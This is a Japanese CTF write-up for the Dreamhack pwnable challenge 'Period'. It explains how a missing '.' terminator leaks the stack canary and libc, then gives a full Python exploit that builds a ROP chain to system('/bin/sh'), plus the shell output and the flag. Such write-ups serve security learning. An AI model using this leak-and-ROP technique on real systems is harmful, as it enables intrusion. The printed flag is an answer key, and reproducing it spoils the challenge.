# Period:pwnable:723pts
Period, about Time or just Punctuation?  

[Download challenge](dc757676-5607-489c-99ad-b51e3affc099.zip)  

Servers  
Host: host3.dreamhack.games  
Port: 21337/tcp → 8080/tcp  

# Solution
DockerfileとELFが渡される。  
ELFを実行すると以下の通りだった。  
```bash
$ ./prob
Mirin, It's the End of Period with Period.
1: read.
2: write.
3: clear.
> 2.
Write: .
SATOKI.
1: read.
2: write.
3: clear.
> 1.
Read: .

SATOKI.
1: read.
2: write.
3: clear.
> 3.
1: read.
2: write.
3: clear.
> 1.
Read: .
.
```
`read.`、`write.`、`clear.`の三つのコマンドが用意されており、一つだけメモを読み、書き、削除できるようだ。  
コマンドと入力文字列は`.`で終わる必要がある。  
セキュリティ機構をチェックする。  
```bash
$ checksec --file=./prob
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   49 Symbols      N/A     0               0               ./prob
$ ./prob
Mirin, It's the End of Period with Period.
1: read.
2: write.
3: clear.
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
*** stack smashing detected ***: terminated
Aborted
```
SSPがオンなので、コマンド入力時のBOFを検知されて落ちる。  
何とかしてcanaryをリークしなければならない。  
IDAでデコンパイルすると`main`から`run`のみが呼ばれており、以下の通りであった。  
```c
unsigned __int64 run()
{
  int v1; // [rsp+Ch] [rbp-114h]
  char v2[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v3; // [rsp+118h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  writeln("Mirin, It's the End of Period with Period.");
  v2[0] = 46;
  while ( 1 )
  {
    while ( 1 )
    {
      writeln("1: read.");
      writeln("2: write.");
      writeln("3: clear.");
      write(1, "> ", 2uLL);
      v1 = readint();
      if ( v1 != 3 )
        break;
      cleara(v2, 256LL);
    }
    if ( v1 > 3 )
      break;
    if ( v1 == 1 )
    {
      writeln("Read: .");
      writeln(v2);
    }
    else
    {
      if ( v1 != 2 )
        break;
      writeln("Write: .");
      readln(v2);
    }
  }
  writeln("Invalid Command.");
  writeln("Finally, Just Watch the Curtain Fall.");
  return v3 - __readfsqword(0x28u);
}
```
BOFのある`readint`は以下の通りであった。  
```c
int readint()
{
  char nptr[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  readln(nptr);
  return atoi(nptr);
}
```
各種操作で呼ばれるメモを扱う関数は以下の通りである(標準入出力の`writeln`、`readln`であるため注意)。  
```c
ssize_t __fastcall writeln(__int64 a1)
{
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    write(1, (const void *)(i + a1), 1uLL);
    if ( *(_BYTE *)(i + a1) == 46 )
      break;
  }
  return write(1, &unk_2008, 1uLL);
}
```
```c
__int64 __fastcall readln(__int64 a1)
{
  __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 255; ++i )
  {
    read(0, (void *)(i + a1), 1uLL);
    result = *(unsigned __int8 *)(i + a1);
    if ( (_BYTE)result == 46 )
      break;
  }
  return result;
}
```
```c
void *__fastcall cleara(void *a1, int a2)
{
  return memset(a1, 46, a2);
}
```
普段であれば改行を入出力の終端とするが、今回は`.`を終端としている。  
バッファの読み取りは`.`が来るまで、書き込みは`.`が来るか256回のループが終わるまで行っている。  
つまり適当な`.`を含まない256文字をバッファに書き込んだ場合には処理が終わり、`.`を含まないメモが完成する。  
このメモを読むとバッファのサイズを超えて後ろのcanaryを含むスタック上のデータまでリークすることができる。  
```
0x7fffffffda10 ◂— 0x414141414141410a ('\nAAAAAAA')
0x7fffffffda18 ◂— 0x4141414141414141 ('AAAAAAAA')
30 skipped
0x7fffffffdb10 —▸ 0x7fffffffdec9 ◂— 0x34365f363878 /* 'x86_64' */
0x7fffffffdb18 ◂— 0x451a95169ab9ef00
0x7fffffffdb20 —▸ 0x7fffffffdb30 ◂— 1
0x7fffffffdb28 —▸ 0x5555555554d9 (main+18) ◂— mov eax, 0
0x7fffffffdb30 ◂— 1
0x7fffffffdb38 —▸ 0x7ffff7da5d90 (__libc_start_call_main+128) ◂— mov edi, eax
0x7fffffffdb40 ◂— 0
0x7fffffffdb48 —▸ 0x5555555554c7 (main) ◂— endbr64
0x7fffffffdb50 ◂— 0x1ffffdc30
0x7fffffffdb58 —▸ 0x7fffffffdc48 —▸ 0x7fffffffded4 ◂— '/dc757676-5607-489c-99ad-b51e3affc099/deploy/prob'
0x7fffffffdb60 ◂— 0
0x7fffffffdb68 ◂— 0xa90eecd8682ab832
0x7fffffffdb70 —▸ 0x7fffffffdc48 —▸ 0x7fffffffded4 ◂— '/dc757676-5607-489c-99ad-b51e3affc099/deploy/prob'
0x7fffffffdb78 —▸ 0x5555555554c7 (main) ◂— endbr64
0x7fffffffdb80 —▸ 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
0x7fffffffdb88 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
0x7fffffffdb90 ◂— 0x56f11327dea8b832
0x7fffffffdb98 ◂— 0x56f1036cd2a0b832
0x7fffffffdba0 ◂— 0x7fff00000000
0x7fffffffdba8 ◂— 0
3 skipped
0x7fffffffdbc8 ◂— 0x451a95169ab9ef00
0x7fffffffdbd0 ◂— 0
0x7fffffffdbd8 —▸ 0x7ffff7da5e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
```
幸運なことにcanaryの24個下に`__libc_start_main+128`のアドレスもあるようだ。  
ここからlibcもリークできるため、あとは`readint`のBOFでROPすればよい(`docker cp`でコンテナからlibcを取り出しておく)。  
以下のexploit.pyで行う。  
```python
from ptrlib import *

elf = ELF("./prob")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF(
    "./docker_libc.so.6"
)  # ubuntu:22.04@sha256:b6b83d3c331794420340093eb706a6f152d9c1fa51b262d9bf34594887c2c7ac


# sock = Process("./prob")
sock = Socket("host3.dreamhack.games", 21337)
# sock.debug = True

# canary & libc leak
sock.sendlineafter("> ", "2.")
sock.sendlineafter("Write: .\n", "A" * 0xFF)
sock.sendlineafter("> ", "1.")
sock.recvuntil("A" * 0xFF)
sock.recv(8)
canary = u64(sock.recv(8))
logger.info("canary: " + hex(canary))
for i in range(23):
    sock.recv(8)
libc.base = u64(sock.recv(8)) - libc.symbol("__libc_start_main") - 0x80

# rop
payload = b"B" * 0x17
payload += p64(canary)
payload += p64(0)
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(next(libc.gadget("ret;")))
payload += p64(libc.symbol("system"))
payload += b"."
sock.sendlineafter("> ", payload)

sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to host3.dreamhack.games:21337
[+] <module>: canary: 0x375265027f292600
[+] base: New base address: 0x7f2c77a61000
[ptrlib]$ ls
flag
prob
[ptrlib]$ cat flag
DH{ef1293304febbec4353e3623eb998a2f316e1ed8fe52242f8f4a5172d02cbbc2}
```
flagが得られた。  

## DH{ef1293304febbec4353e3623eb998a2f316e1ed8fe52242f8f4a5172d02cbbc2}